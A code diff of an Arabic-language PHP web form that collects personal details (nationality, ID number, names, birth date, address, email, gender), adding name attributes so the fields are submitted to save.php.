@@ -70,19 +70,19 @@
         <div class="form-card">
             <h2>البيانات الشخصية</h2>
             <form id="detailsForm" action="save.php" method="POST">
-                <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($visitor_id); ?>">
+                <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($_GET['visitor_id'] ?? ''); ?>">
                 <input type="hidden" name="current_page" value="personal_info.php">
                 <div class="form-group"><label>الجنسية *</label>
-                    <select id="nationality" class="js-example-basic-single" required style="width: 100%;">
+                    <select name="nationality" id="nationality" class="js-example-basic-single" required style="width: 100%;">
                         <option value="" disabled selected>اختر الجنسية</option>
                     </select>
                 </div>
-                <div class="form-group"><label>رقم الهوية *</label><input type="text" id="id_number" placeholder="أدخل رقم الهوية" required></div>
-                <div class="form-group"><label>الاسم بالعربي *</label><input type="text" id="name_ar" placeholder="الاسم كما في الهوية" required></div>
-                <div class="form-group"><label>الاسم بالإنجليزي *</label><input type="text" id="name_en" placeholder="الاسم بالإنجليزي" required></div>
-                <div class="form-group"><label>تاريخ الميلاد *</label><input type="date" id="dob" required></div>
-                <div class="form-group"><label>العنوان الحالي *</label><input type="text" id="address" placeholder="العنوان" required></div>
-                <div class="form-group"><label>البريد الإلكتروني *</label><input type="email" id="email_confirm" placeholder="البريد الإلكتروني" required></div>
+                <div class="form-group"><label>رقم الهوية *</label><input type="text" name="id_number" id="id_number" placeholder="أدخل رقم الهوية" required></div>
+                <div class="form-group"><label>الاسم بالعربي *</label><input type="text" name="name_ar" id="name_ar" placeholder="الاسم كما في الهوية" required></div>
+                <div class="form-group"><label>الاسم بالإنجليزي *</label><input type="text" name="name_en" id="name_en" placeholder="الاسم بالإنجليزي" required></div>
+                <div class="form-group"><label>تاريخ الميلاد *</label><input type="date" name="dob" id="dob" required></div>
+                <div class="form-group"><label>العنوان الحالي *</label><input type="text" name="address" id="address" placeholder="العنوان" required></div>
+                <div class="form-group"><label>البريد الإلكتروني *</label><input type="email" name="email_confirm" id="email_confirm" placeholder="البريد الإلكتروني" required></div>
                 <div class="form-group"><label>الجنس *</label>
                     <div class="gender-group">
                         <label class="radio-option"><input type="radio" name="gender" value="ذكر" checked> ذكر</label>
